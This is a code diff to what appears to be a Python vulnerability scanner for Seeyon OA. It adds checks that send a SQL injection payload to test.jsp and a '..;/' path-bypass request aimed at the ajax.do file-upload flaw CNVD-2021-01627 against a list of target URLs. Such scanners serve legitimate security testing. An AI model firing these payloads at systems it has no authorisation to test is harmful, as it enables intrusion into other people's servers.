@@ -564,6 +564,8 @@ def seeyon_vuln_scan():
 
     }
     for url in url_list:
+        print("\n")
+        print("----------------------"+url+"----------------------")
         # 获取当前时间
         now = datetime.now()
         # 格式化时间，只保留时、分、秒
@@ -660,6 +662,35 @@ def seeyon_vuln_scan():
                 print("[-]"+" "+formatted_time+" "+"目标："+" "+url+" "+"不存在致远OA webmail.do 任意文件下载 CNVD-2020-62422")
         except:
             pass
+        # ⑦、致远OA A6 test.jsp SQL注入漏洞
+        seeyon_test_sql_dir = "/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20database())"
+        try:
+           # 忽略ssl证书验证
+            seeyon_test_sql_res = requests.get(url+seeyon_test_sql_dir,headers=hearder,allow_redirects=False,timeout=1,verify=False)
+            seeyon_test_sql_res.encoding='utf-8'
+            seeyon_test_sql_res_text = seeyon_test_sql_res.text
+           
+            if seeyon_test_sql_res.status_code == 200 and   'database' in seeyon_test_sql_res_text and 'mysql' in seeyon_test_sql_res_text:
+                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+seeyon_test_sql_dir+" "+"存在致远OA A6 test.jsp SQL注入漏洞")
+            else:
+                print("[-]"+" "+formatted_time+" "+"目标："+" "+url+" "+"不存在致远OA A6 test.jsp SQL注入漏洞")
+        except:
+            pass
+        # ⑧、致远OA ajax.do 任意文件上传 CNVD-2021-01627
+        seeyon_ajax_dir = "/seeyon/thirdpartyController.do.css/..;/ajax.do"
+        try:
+           # 忽略ssl证书验证
+            seeyon_ajax_res = requests.get(url+seeyon_ajax_dir,headers=hearder,allow_redirects=False,timeout=1,verify=False)
+            seeyon_ajax_res.encoding='utf-8'
+            seeyon_ajax_res_text = seeyon_ajax_res.text
+           
+            if seeyon_ajax_res.status_code == 200 and  'java.lang.NullPointerException:null' in seeyon_ajax_res_text:
+                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+seeyon_ajax_dir+" "+"存在致远OA ajax.do 任意文件上传 CNVD-2021-01627")
+            else:
+                print("[-]"+" "+formatted_time+" "+"目标："+" "+url+" "+"不存在致远OA ajax.do 任意文件上传 CNVD-2021-01627")
+        except:
+            pass
+
         
            
 
